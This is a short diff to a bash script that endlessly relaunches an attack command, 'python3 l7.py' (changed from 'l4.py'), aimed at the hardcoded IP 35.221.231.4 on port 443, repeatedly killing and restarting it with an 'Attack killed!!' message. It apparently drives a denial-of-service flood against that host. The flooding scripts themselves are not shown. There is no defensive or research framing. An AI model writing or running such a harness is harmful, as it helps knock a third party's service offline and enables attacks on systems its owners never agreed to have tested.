@@ -1,6 +1,6 @@
 #!/bin/bash
 procname="python3"
-atk_cmd="python3 l4.py -i 35.221.231.4 -p 443"
+atk_cmd="python3 l7.py -i 35.221.231.4 -p 443"
 while true
 do
     $atk_cmd >/dev/null &
@@ -9,5 +9,5 @@ do
     echo Attack killed!!
     kill $(ps aux | grep $procname | grep -v grep | awk '{print $2}')
     $atk_cmd >/dev/null &
-    sleep 0.01
+    sleep 1
 done
